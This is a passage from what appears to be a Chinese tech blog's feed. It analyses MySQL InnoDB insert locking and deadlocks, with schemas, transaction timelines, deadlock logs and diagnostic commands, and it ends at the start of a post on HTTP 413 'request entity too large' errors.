class="built_in">test</span>`.`aa` trx id 36729 lock_mode X insert intention waiting</span><br><span class="line">Record lock, heap no 1 PHYSICAL RECORD: n_fields 1; compact format; info bits 0</span><br><span class="line"> 0: len 8; hex 73757072656d756d; asc supremum;;</span><br><span class="line"></span><br><span class="line">*** WE ROLL BACK TRANSACTION (2)</span><br></pre></td></tr></table></figure><h4 id="死锁成因"><a href="#死锁成因" class="headerlink" title="死锁成因"></a>死锁成因</h4><p>事务T1成功插入记录，并获得索引id=6上的排他记录锁(LOCK_X | LOCK_REC_NOT_GAP)。<br>紧接着事务T2、T3也开始插入记录，请求排他插入意向锁(LOCK_X | LOCK_GAP | LOCK_INSERT_INTENTION)；但由于发生重复唯一键冲突，各自请求的排他记录锁(LOCK_X | LOCK_REC_NOT_GAP)转成共享记录锁(LOCK_S | LOCK_REC_NOT_GAP)。</p><p>T1回滚释放索引id=6上的排他记录锁(LOCK_X | LOCK_REC_NOT_GAP)，T2和T3都要请求索引id=6上的排他记录锁(LOCK_X | LOCK_REC_NOT_GAP)。<br>由于X锁与S锁互斥，T2和T3都等待对方释放S锁。<br>于是，死锁便产生了。</p><p>如果此场景下，只有两个事务T1与T2或者T1与T3，则不会引发如上死锁情况产生。</p><h4 id="思考-1"><a href="#思考-1" class="headerlink" title="思考"></a>思考</h4><ul><li><p>为什么发现重复主键冲突的时候，要将事务请求的X锁转成S锁？<br>(比较牵强的)个人理解，跟插入意向锁类型，也是为了提高插入的并发效率。</p></li><li><p>插入前请求插入意向锁的作用？<br>个人认为，通过兼容矩阵来分析，Insert Intention Locks是为了减少插入时的锁冲突。</p></li></ul><h3 id="2-GAP与Insert-Intention冲突引发的死锁"><a href="#2-GAP与Insert-Intention冲突引发的死锁" class="headerlink" title="2. GAP与Insert Intention冲突引发的死锁"></a>2. GAP与Insert Intention冲突引发的死锁</h3><h4 id="表结构-1"><a href="#表结构-1" class="headerlink" title="表结构"></a>表结构</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `t` (</span><br><span class="line">  `a` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `b` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  <span class="keyword">PRIMARY</span> KEY (`a`),</span><br><span class="line">  KEY `idx_b` (`b`)</span><br><span class="line">) ENGINE<span class="operator">=</span>InnoDB <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8;</span><br></pre></td></tr></table></figure><h4 id="表数据-1"><a href="#表数据-1" class="headerlink" title="表数据"></a>表数据</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from t;</span><br><span class="line">+----+------+</span><br><span class="line">| a  | b    |</span><br><span class="line">+----+------+</span><br><span class="line">|  1 |    2 |</span><br><span class="line">|  2 |    3 |</span><br><span class="line">|  3 |    4 |</span><br><span class="line">| 11 |   22 |</span><br><span class="line">+----+------+</span><br></pre></td></tr></table></figure><h4 id="事务执行时序表-1"><a href="#事务执行时序表-1" class="headerlink" title="事务执行时序表"></a>事务执行时序表</h4><p>| T1(36831) | T2(36832) |<br>|—|—|—|<br>| begin; | begin; |<br>| select * from t where b = 6 for update; | |<br>| | select * from t where b = 8 for update; |<br>| insert into t values (4,5); | |<br>| | insert into t values (4,5); |<br>| | ERROR 1213 (40001): Deadlock found when trying to get lock; try restarting transaction |<br>| Query OK, 1 row affected (5.45 sec) | &nbsp; |</p><h4 id="事务锁占用情况-1"><a href="#事务锁占用情况-1" class="headerlink" title="事务锁占用情况"></a>事务锁占用情况</h4><p>T2 insert前，各事务锁占用情况：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from information_schema.innodb_locks;</span><br><span class="line">+--------------+-------------+-----------+-----------+------------+------------+------------+-----------+----------+-----------+</span><br><span class="line">| lock_id      | lock_trx_id | lock_mode | lock_type | lock_table | lock_index | lock_space | lock_page | lock_rec | lock_data |</span><br><span class="line">+--------------+-------------+-----------+-----------+------------+------------+------------+-----------+----------+-----------+</span><br><span class="line">| 36831:25:4:5 | 36831       | X,GAP     | RECORD    | `<span class="built_in">test</span>`.`t` | idx_b      |         25 |         4 |        5 | 22, 11    |</span><br><span class="line">| 36832:25:4:5 | 36832       | X,GAP     | RECORD    | `<span class="built_in">test</span>`.`t` | idx_b      |         25 |         4 |        5 | 22, 11    |</span><br><span class="line">+--------------+-------------+-----------+-----------+------------+------------+------------+-----------+----------+-----------+</span><br></pre></td></tr></table></figure><h4 id="死锁日志-1"><a href="#死锁日志-1" class="headerlink" title="死锁日志"></a>死锁日志</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">------------------------</span><br><span class="line">LATEST DETECTED DEADLOCK</span><br><span class="line">------------------------</span><br><span class="line">2016-07-28 12:28:34 700000a3f000</span><br><span class="line">*** (1) TRANSACTION:</span><br><span class="line">TRANSACTION 36831, ACTIVE 17 sec inserting</span><br><span class="line">mysql tables in use 1, locked 1</span><br><span class="line">LOCK WAIT 4 lock struct(s), heap size 1184, 3 row lock(s), undo log entries 1</span><br><span class="line">MySQL thread id 38, OS thread handle 0x700000b0b000, query id 953 localhost root update</span><br><span class="line">insert into t values (4,5)</span><br><span class="line">*** (1) WAITING FOR THIS LOCK TO BE GRANTED:</span><br><span class="line">RECORD LOCKS space id 25 page no 4 n bits 72 index `idx_b` of table `test`.`t` trx id 36831 lock_mode X locks gap before rec insert intention waiting</span><br><span class="line">Record lock, heap no 5 PHYSICAL RECORD: n_fields 2; compact format; info bits 0</span><br><span class="line"> 0: len 4; hex 80000016; asc     ;;</span><br><span class="line"> 1: len 4; hex 8000000b; asc     ;;</span><br><span class="line"></span><br><span class="line">*** (2) TRANSACTION:</span><br><span class="line">TRANSACTION 36832, ACTIVE 13 sec inserting</span><br><span class="line">mysql tables in use 1, locked 1</span><br><span class="line">3 lock struct(s), heap size 360, 2 row lock(s)</span><br><span class="line">MySQL thread id 39, OS thread handle 0x700000a3f000, query id 954 localhost root update</span><br><span class="line">insert into t values (4,5)</span><br><span class="line">*** (2) HOLDS THE LOCK(S):</span><br><span class="line">RECORD LOCKS space id 25 page no 4 n bits 72 index `idx_b` of table `test`.`t` trx id 36832 lock_mode X locks gap before rec</span><br><span class="line">Record lock, heap no 5 PHYSICAL RECORD: n_fields 2; compact format; info bits 0</span><br><span class="line"> 0: len 4; hex 80000016; asc     ;;</span><br><span class="line"> 1: len 4; hex 8000000b; asc     ;;</span><br><span class="line"></span><br><span class="line">*** (2) WAITING FOR THIS LOCK TO BE GRANTED:</span><br><span class="line">RECORD LOCKS space id 25 page no 3 n bits 72 index `PRIMARY` of table `test`.`t` trx id 36832 lock mode S locks rec but not gap waiting</span><br><span class="line">Record lock, heap no 5 PHYSICAL RECORD: n_fields 4; compact format; info bits 0</span><br><span class="line"> 0: len 4; hex 80000004; asc     ;;</span><br><span class="line"> 1: len 6; hex 000000008fdf; asc       ;;</span><br><span class="line"> 2: len 7; hex 8d000001d00110; asc        ;;</span><br><span class="line"> 3: len 4; hex 80000005; asc     ;;</span><br><span class="line"></span><br><span class="line">*** WE ROLL BACK TRANSACTION (2)</span><br></pre></td></tr></table></figure><h4 id="死锁成因-1"><a href="#死锁成因-1" class="headerlink" title="死锁成因"></a>死锁成因</h4><p>事务T1执行查询语句，在索引b=6上加排他Next-key锁(LOCK_X | LOCK_ORDINARY)，会锁住idx_b索引范围(4, 22)。<br>事务T2执行查询语句，在索引b=8上加排他Next-key锁(LOCK_X | LOCK_ORDINARY)，会锁住idx_b索引范围(4, 22)。由于请求的GAP与已持有的GAP是兼容的，因此，事务T2在idx_b索引范围(4, 22)也能加锁成功。</p><p>事务T1执行插入语句，会先加排他Insert Intention锁。由于请求的Insert Intention锁与已有的GAP锁不兼容，则事务T1等待T2释放GAP锁。<br>事务T2执行插入语句，也会等待T1释放GAP锁。<br>于是，死锁便产生了。</p><p><strong>注</strong>：LOCK_ORDINARY拥有LOCK_GAP一部分特性。</p><h4 id="思考：Insert-Intention锁在加哪级索引上？"><a href="#思考：Insert-Intention锁在加哪级索引上？" class="headerlink" title="思考：Insert Intention锁在加哪级索引上？"></a>思考：Insert Intention锁在加哪级索引上？</h4><p>这个排他锁加在PK上，还是二级索引上？</p><h2 id="六、课后思考"><a href="#六、课后思考" class="headerlink" title="六、课后思考"></a>六、课后思考</h2><ol><li><p>无主键的加锁过程<br>无PK时，会创建一个隐式聚簇索引。加锁在这个隐式聚簇索引会有什么不同？</p></li><li><p>复合索引加锁过程</p></li><li><p>多条件(where condition)加锁过程</p></li><li><p>隐式锁与显式锁，隐式锁什么情况下会转换成显式锁</p></li><li><p>如果插入意向锁不阻止任何锁，这个锁还有必要存在吗？<br>目前看到的作用是，通过加锁的方式来唤醒等待线程。<br>但这并不意味着，被唤醒后可以直接做插入操作了。需要再次判断是否有锁冲突。</p></li></ol><h2 id="七、补充知识"><a href="#七、补充知识" class="headerlink" title="七、补充知识"></a>七、补充知识</h2><h3 id="1-查看事务隔离级别"><a href="#1-查看事务隔离级别" class="headerlink" title="1. 查看事务隔离级别"></a>1. 查看事务隔离级别</h3><p>SELECT @@global.tx_isolation;<br>SELECT @@session.tx_isolation;<br>SELECT @@tx_isolation;</p><h3 id="2-设置隔离级别"><a href="#2-设置隔离级别" class="headerlink" title="2. 设置隔离级别"></a>2. 设置隔离级别</h3><p>SET [SESSION | GLOBAL] TRANSACTION ISOLATION LEVEL {READ UNCOMMITTED | READ COMMITTED | REPEATABLE READ | SERIALIZABLE}<br>例如：set session transaction isolation level read uncommitted;</p><h3 id="3-查看auto-increment机制模式"><a href="#3-查看auto-increment机制模式" class="headerlink" title="3. 查看auto_increment机制模式"></a>3. 查看auto_increment机制模式</h3><p>show variables like ‘innodb_autoinc_lock_mode’;</p><h3 id="4-查看表状态"><a href="#4-查看表状态" class="headerlink" title="4. 查看表状态"></a>4. 查看表状态</h3><p>show table status like ‘plan_branch’\G;<br>show table status from test like ‘plan_branch’\G;</p><h3 id="5-查看SQL性能"><a href="#5-查看SQL性能" class="headerlink" title="5. 查看SQL性能"></a>5. 查看SQL性能</h3><p>show profiles<br>show profile for query 1;</p><h3 id="6-查看当前最新事务ID"><a href="#6-查看当前最新事务ID" class="headerlink" title="6. 查看当前最新事务ID"></a>6. 查看当前最新事务ID</h3><p>每开启一个新事务，记录当前最新事务的id，可用于后续死锁分析。<br>show engine innodb status\G;</p><h3 id="7-查看事务锁等待状态情况"><a href="#7-查看事务锁等待状态情况" class="headerlink" title="7. 查看事务锁等待状态情况"></a>7. 查看事务锁等待状态情况</h3><p>select * from information_schema.innodb_locks;<br>select * from information_schema.innodb_lock_waits;<br>select * from information_schema.innodb_trx;</p><h3 id="8-查看innodb状态-包含最近的死锁日志"><a href="#8-查看innodb状态-包含最近的死锁日志" class="headerlink" title="8. 查看innodb状态(包含最近的死锁日志)"></a>8. 查看innodb状态(包含最近的死锁日志)</h3><p>show engine innodb status;</p><h2 id="八、参考文档"><a href="#八、参考文档" class="headerlink" title="八、参考文档"></a>八、参考文档</h2><p>[^1]: <a href="https://dev.mysql.com/doc/refman/5.6/en/innodb-parameters.html">InnoDB Startup Options and System Variables</a><br>[^2]: <a href="http://dev.mysql.com/doc/refman/5.6/en/innodb-locking.html">InnoDB Locking</a><br>[^3]: <a href="http://dev.mysql.com/doc/refman/5.6/en/innodb-index-types.html">Clustered and Secondary Indexes</a><br>[^4]: <a href="http://www.cnblogs.com/renolei/p/4673842.html">[MySQL] gap lock/next-key lock浅析</a><br>[^5]: <a href="http://hedengcheng.com/?p=771#comment-5543">Intention Lock是否表级锁</a><br>[^6]: <a href="http://dev.mysql.com/doc/refman/5.6/en/innodb-locks-set.html">Locks Set by Different SQL Statements in InnoDB</a><br>[^7]: <a href="http://feiyang21687.github.io/Mysql-Transaction/">一个Mysql的死锁现象，及复现过程</a><br>[^8]: <a href="http://www.cnblogs.com/renolei/p/5559135.html">AUTO_INCREMENT lock Handing in InnoDB</a><br>[^9]: <a href="http://blog.csdn.net/cug_jiang126com/article/details/50596729">深入理解innodb的锁(record,gap,Next-Key lock)</a><br>[^10]: <a href="http://blog.csdn.net/and1kaney/article/details/51213979">information_schema中Innodb相关表用于分析sql查询锁的使用情况介绍</a><br>[^11]: <a href="http://dev.mysql.com/doc/refman/5.5/en/innodb-locks-table.html">The INFORMATION_SCHEMA INNODB_LOCKS Table</a><br>[^12]: <a href="http://dev.mysql.com/doc/refman/5.5/en/innodb-trx-table.html">The INFORMATION_SCHEMA INNODB_TRX Table</a><br>[^13]: <a href="http://blog.csdn.net/yanzongshuai/article/details/46398609">mysql innodb插入意向锁</a></p>]]></content>
    
    
    <summary type="html">&lt;img src=&quot;/asserts/images/logo/mysql.png&quot; class=&quot;img-logo img-center&quot; /&gt;


&lt;h2 id=&quot;一、前言&quot;&gt;&lt;a href=&quot;#一、前言&quot; class=&quot;headerlink&quot; title=&quot;一、前言&quot;&gt;&lt;/a&gt;一、前言&lt;/h2&gt;&lt;p&gt;上周遇到一个因insert而引发的死锁问题，其成因比较令人费解。&lt;br&gt;于是想要了解一下insert加锁机制，但是发现网上介绍的文章比较少且零散，挖掘过程比较忙乱。&lt;/p&gt;
&lt;p&gt;本以为只需要系统学习一个较完全的逻辑，但是实际牵扯很多innodb锁相关知识及加锁方式。我好像并没有那么大的能耐，把各种场景的加锁过程一一列举并加之分析；亦没有太多的精力验证网上的言论的准确性。&lt;/p&gt;
&lt;p&gt;只好根据现在了解的内容，参考官方文档，说说自己当前的理解。&lt;br&gt;本文仅供参考，如有误导，概不负责。&lt;/p&gt;
&lt;h2 id=&quot;二、现场状态&quot;&gt;&lt;a href=&quot;#二、现场状态&quot; class=&quot;headerlink&quot; title=&quot;二、现场状态&quot;&gt;&lt;/a&gt;二、现场状态&lt;/h2&gt;&lt;p&gt;不同的mysql版本，不同的参数设置，都可能对加锁过程有影响。&lt;br&gt;分析加锁机制还是应当尽可能多地列举一下关键参数，例如：当前mysql版本、事务隔离级别等。&lt;br&gt;如下，仅仅只列出个别比较重要的参数。&lt;/p&gt;
&lt;h3 id=&quot;1-数据库版本&quot;&gt;&lt;a href=&quot;#1-数据库版本&quot; class=&quot;headerlink&quot; title=&quot;1.数据库版本&quot;&gt;&lt;/a&gt;1.数据库版本&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;mysql&amp;gt; select version();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;+-----------+&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;| version() |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;+-----------+&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;| 5.6.27    |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;+-----------+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&quot;2-数据库引擎&quot;&gt;&lt;a href=&quot;#2-数据库引擎&quot; class=&quot;headerlink&quot; title=&quot;2. 数据库引擎&quot;&gt;&lt;/a&gt;2. 数据库引擎&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;mysql&amp;gt; show variables like &lt;span class=&quot;string&quot;&gt;&amp;#x27;%engine%&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;+----------------------------+--------+&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;| Variable_name              | Value  |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;+----------------------------+--------+&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;| default_storage_engine     | InnoDB |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;| default_tmp_storage_engine | InnoDB |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;| storage_engine             | InnoDB |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;+----------------------------+--------+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;注&lt;/strong&gt;：InnoDB支持事务，Myisam不支持事务；InnoDB支持行锁和表锁；Myisam不支持行锁。&lt;/p&gt;
&lt;h3 id=&quot;3-事务隔离级别&quot;&gt;&lt;a href=&quot;#3-事务隔离级别&quot; class=&quot;headerlink&quot; title=&quot;3. 事务隔离级别&quot;&gt;&lt;/a&gt;3. 事务隔离级别&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;mysql&amp;gt; select @@global.tx_isolation, @@session.tx_isolation, @@tx_isolation;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;+-----------------------+------------------------+-----------------+&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;| @@global.tx_isolation | @@session.tx_isolation | @@tx_isolation  |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;+-----------------------+------------------------+-----------------+&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;| REPEATABLE-READ       | REPEATABLE-READ        | REPEATABLE-READ |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;+-----------------------+------------------------+-----------------+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;注&lt;/strong&gt;：几种事务隔离级别：READ UNCOMMITTED | READ COMMITTED | REPEATABLE READ | SERIALIZABLE&lt;/p&gt;
&lt;h3 id=&quot;4-查看gap锁开启状态&quot;&gt;&lt;a href=&quot;#4-查看gap锁开启状态&quot; class=&quot;headerlink&quot; title=&quot;4. 查看gap锁开启状态&quot;&gt;&lt;/a&gt;4. 查看gap锁开启状态&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;mysql&amp;gt; show variables like &lt;span class=&quot;string&quot;&gt;&amp;#x27;innodb_locks_unsafe_for_binlog&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;+--------------------------------+-------+&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;| Variable_name                  | Value |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;+--------------------------------+-------+&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;| innodb_locks_unsafe_for_binlog | OFF   |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;+--------------------------------+-------+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;innodb_locks_unsafe_for_binlog：默认值为0，即启用gap lock。&lt;br&gt;最主要的作用就是控制innodb是否对gap加锁。&lt;br&gt;但是，这一设置变更并不影响外键和唯一索引（含主键）对gap进行加锁的需要。&lt;br&gt;开启innodb_locks_unsafe_for_binlog的REPEATABLE-READ事务隔离级别，很大程度上已经蜕变成了READ-COMMITTED。&lt;/p&gt;
&lt;p&gt;参见官方文档[^1]：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;By default, the value of innodb_locks_unsafe_for_binlog is 0 (disabled), which means that gap locking is enabled: InnoDB uses next-key locks for searches and index scans. To enable the variable, set it to 1. This causes gap locking to be disabled: InnoDB uses only index-record locks for searches and index scans.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;Enabling innodb_locks_unsafe_for_binlog does not disable the use of gap locking for foreign-key constraint checking or duplicate-key checking.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;The effect of enabling innodb_locks_unsafe_for_binlog is similar to but not identical to setting the transaction isolation level to READ COMMITTED.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;5-查看自增锁模式&quot;&gt;&lt;a href=&quot;#5-查看自增锁模式&quot; class=&quot;headerlink&quot; title=&quot;5. 查看自增锁模式&quot;&gt;&lt;/a&gt;5. 查看自增锁模式&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;mysql&amp;gt; show variables like &lt;span class=&quot;string&quot;&gt;&amp;#x27;innodb_autoinc_lock_mode&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;+--------------------------+-------+&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;| Variable_name            | Value |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;+--------------------------+-------+&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;| innodb_autoinc_lock_mode | 1     |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;+--------------------------+-------+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;innodb_autoinc_lock_mode有3种配置模式：0、1、2，分别对应”传统模式”, “连续模式”, “交错模式”。[^8]&lt;br&gt;传统模式：涉及auto-increment列的插入语句加的表级AUTO-INC锁，只有插入执行结束后才会释放锁。这是一种兼容MySQL 5.1之前版本的策略。&lt;br&gt;连续模式：可以事先确定插入行数的语句(包括单行和多行插入)，分配连续的确定的auto-increment值；对于插入行数不确定的插入语句，仍加表锁。这种模式下，事务回滚，auto-increment值不会回滚，换句话说，自增列内容会不连续。&lt;br&gt;交错模式：同一时刻多条SQL语句产生交错的auto-increment值。&lt;/p&gt;
&lt;p&gt;由于insert语句常常涉及自增列的加锁过程，会涉及到AUTO-INC Locks加锁过程。&lt;br&gt;为了分步了解insert加锁过程，本文暂不讨论任何涉及自增列的加锁逻辑。&lt;br&gt;这一参数设置相关内容可能会出现在我的下一篇文章里。&lt;/p&gt;</summary>
    
    
    
    <category term="数据存储" scheme="http://yeshaoting.cn/categories/%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8/"/>
    
    
    <category term="mysql" scheme="http://yeshaoting.cn/tags/mysql/"/>
    
    <category term="innodb" scheme="http://yeshaoting.cn/tags/innodb/"/>
    
  </entry>
  
  <entry>
    <title>request entity too large</title>
    <link href="http://yeshaoting.cn/article/java/request%20entity%20too%20large/"/>
    <id>http://yeshaoting.cn/article/java/request%20entity%20too%20large/</id>
    <published>2016-07-18T06:24:00.000Z</published>
    <updated>2021-07-01T04:25:31.000Z</updated>
    
    <content type="html"><![CDATA[<img src="/asserts/images/logo/javaee.png" class="img-logo img-center" /><h2 id="一、问题描述"><a href="#一、问题描述" class="headerlink" title="一、问题描述"></a>一、问题描述</h2><p>拍照上传图片时，系统提示: request entity too large，错误码为413。</p><h2 id="二、问题分析"><a href="#二、问题分析" class="headerlink" title="二、问题分析"></a>二、问题分析</h2><p>翻阅http状态码查看413解释如下:</p><blockquote><p>413 Request entity too large<br>The request is larger than what the server is able to process.</p></blockquote><p>由此可知，应该是上传照片超过服务器的限制。</p><h2 id="三、解决方案"><a href="#三、解决方案" class="headerlink" title="三、解决方案"></a>三、解决方案</h2><h3 id="1-解除域名服务器限制"><a href="#1-解除域名服务器限制" class="headerlink" title="1. 解除域名服务器限制"></a>1. 解除域名服务器限制</h3><p>一般情况下，域名服务器选用apache和nginx比较多。</p><h4 id="apache"><a href="#apache" class="headerlink" title="apache"></a>apache</h4><p>对apache服务器而言，相关参数为: <code>LimitRequestBody</code><br>默认值为0，表示最大2GB。</p><p>官方解释如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Description:Restricts the total size of the HTTP request body sent from the client</span><br><span class="line">Syntax:LimitRequestBody bytes</span><br><span class="line">Default:LimitRequestBody 0</span><br><span class="line">Context:server config, virtual host, directory, .htaccess</span><br><span class="line">Override:All</span><br><span class="line">Status:Core</span><br><span class="line">Module:core</span><br></pre></td></tr></table></figure><span id="more"></span><blockquote><p>This directive specifies the number of bytes from 0 (meaning unlimited) to 2147483647 (2GB) that are allowed in a request 